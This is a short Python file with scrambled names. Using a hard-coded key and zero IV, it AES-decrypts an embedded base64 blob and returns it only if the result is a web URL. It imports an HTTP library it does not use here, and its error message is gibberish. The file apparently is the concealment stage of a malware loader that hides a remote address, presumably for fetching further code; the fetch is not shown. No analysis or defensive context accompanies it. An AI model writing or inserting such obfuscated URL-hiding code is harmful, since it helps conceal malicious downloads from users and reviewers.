import requests
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64decode
import json

def zhrnxx_vbwnnk():
    mnclx_key = b'jigglemigle_zulm'
    mnclx_key = mnclx_key.ljust(16, b'\0')

    vdxrrd_qyowk = b'ZTYk2CMDZECwXMxyTKoMFfL8df1VvZB5LpdBUisrunsDJR7gwNy9kw7+zuxtAwtVuPLgRPg+f7VSoSXd9Ymlt41Ak953netzKoejiT7r7qHJuO1LuYAx94M6un2FysxkzEFE8d5ZfGNvzoRGA910D/cSs0Lzwaemc0n+iKzcGKU='

    pghkln_iv = b'\0' * 16
    rwjykf_cywr = AES.new(mnclx_key, AES.MODE_CBC, pghkln_iv)

    decrypted_data = unpad(rwjykf_cywr.decrypt(b64decode(vdxrrd_qyowk)), AES.block_size)

    try:
        zvmbokt_data = decrypted_data.decode('utf-8')
    except UnicodeDecodeError:
        zvmbokt_data = decrypted_data

    if zvmbokt_data.startswith('http://') or zvmbokt_data.startswith('https://'):
        return zvmbokt_data.strip()
    else:
        raise ValueError("jyg jyegf  fdgy u f")
